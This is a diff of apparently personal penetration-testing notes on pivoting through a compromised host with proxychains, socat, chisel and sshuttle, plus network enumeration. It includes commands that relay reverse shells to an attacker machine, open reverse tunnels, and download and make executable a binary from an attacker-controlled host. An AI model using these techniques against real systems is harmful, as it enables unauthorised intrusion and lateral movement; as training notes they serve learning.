@@ -88,17 +88,6 @@ before from 80/443 port scan.
   
   Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed.
   
-  ### Enumerating before pivoting
-  
-  Information is power - our first step when attempting to pivot through a network is to get an idea of what's around us. Ideally we want to take advantage of pre-installed
-  tools on the system to enumerate a network through a compromised host. This is called Living off the Land (LotL) - a good way to minimise risk.
-  ```
-  ifconfig
-  arp -a
-  cat /etc/hosts
-  cat /etc/resolv.conf
-  ```
-  
   ---
   
   ## Theory behind pivoting
@@ -110,7 +99,7 @@ before from 80/443 port scan.
   - Stable linux shell with socat
   - Chisel as your proxy/port forwarding tool
   - sshuttle as your tunnelled proxy
-  - 
+
   ### Proxy tool #1 - Proxychains
   
   Proxychains is a command line tool which is activated by prepending the command _proxychains_ to other commands. For example to proxy netcat it would look like this :
@@ -186,7 +175,8 @@ before from 80/443 port scan.
       ```
       socat tcp-l:8000 tcp:<ATTACKING IP>:445 &
       ```
-      In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. 
+      In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. The ampersand & symbol at the end backgrounds
+      this particular job.
   
   
   2. Port forwarding
@@ -201,6 +191,7 @@ before from 80/443 port scan.
       To kill any of the jobs you created you need to simply find it in `jobs` and then `kill %<NUMBER OF THE JOB>`.
 
   ### Chisel
+  
   It's an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH
   access or not. To work you must have an appropriate copy of the chisel binary on both the attacking machine and the compromised server. 
   
@@ -241,6 +232,7 @@ before from 80/443 port scan.
   
   
       Attacker machine command is exact the same as with the Reverse SOCKS Proxy to setup a chisel listener to connect back to.
+  
       Target machine :
       ```
       chisel client <ATTACKING IP>:<LISTEN PORT> R:<LOCAL PORT>:<TARGET IP>:<TARGET PORT> &
@@ -251,6 +243,7 @@ before from 80/443 port scan.
   
   
       As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a target.
+  
       Target machine :
       ```
       chisel server -p <LISTEN PORT>
@@ -260,6 +253,56 @@ before from 80/443 port scan.
       chisel client <LISTEN IP>:<LISTEN PORT> <LOCAL PORT>:<TARGET IP>:<TARGET PORT>
       ```
   
+  ### Sshuttle
   
+  This tool is quite different because it doesn't perform a port forward, and the proxy it creates is nothing like the onew we have already seen.
+  Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. It simulates a VPN, allowing us to route our traffic through the proxy
+  without the use of proxychains. We can just directly connect to devices in the target network as we would normally connect to networked devices. we use sshuttle entirely
+  on our attacking machine, in much the same way we would SSH into a remote server. But there are some drawbacks. For a start sshuttle only works on Linux targets, it also
+  requires access to the target machine via SSH and the target machine must have python installed. 
+  Sshuttle installing :
+  ```
+  sudo apt install sshuttle
+  ```
+  Base command for connecting to a server with sshuttle :
+  ```
+  sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP>
+  ```
+  But what happens if we don't have the user's password, or the server only accepts key-based authentication? Sshuttle doesn't currently seem to have a shorthand for specifying 
+  a private key to authenticate to the server with. Because of that we use `--ssh-cmd` switch that allows us to specify what command gets executed by sshuttle.
+  ```
+  sshuttle -r <USERNAME>@<TARGET IP> --ssh-cmd "ssh -i <KEY FILE> <TARGET SUBNET IP>
+  ```
+  If we are connecting to the target machine and this target machine is part of the subnet we're attempting to gain access to we can stumble upon error code 255 or
+  "Broken pipe". To get around this we tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch.
+  ```
+  sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP> -x <TARGET IP>
+  sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
+  ```
   
   ---
+  
+  ## Enumerating before pivoting
+  
+  Information is power - our first step when attempting to pivot through a network is to get an idea of what's around us. Ideally we want to take advantage of pre-installed
+  tools on the system to enumerate a network through a compromised host. This is called Living off the Land (LotL) - a good way to minimise risk.
+  ```
+  ifconfig
+  arp -a
+  cat /etc/hosts
+  cat /etc/resolv.conf
+  ```
+  Next up we will download a static nmap binary on our attacker machine and download it using python server and `curl` to our target machine. 
+  ```
+  sudo python3 -m http.server 80
+  curl <ATTACKER IP>/nmap -o /tmp/nmap && chmod +x /tmp/nmap
+  ```
+  With that binary we can scan the network from target machine. We should get some interesting hosts and services.
+  ```
+  ./nmap -sn 10.200.159.1-255 -oN scan.txt
+  ```
+  If you don't already know `-sn` switch is used to tell nmap not to scan any port and instead just determine which hosts are alive. We can do the same with `fping`.
+  After that we can focus only on those hosts that are alive instead of scanning the whole network and all ports. It would be waste of our time.
+  
+  
+  
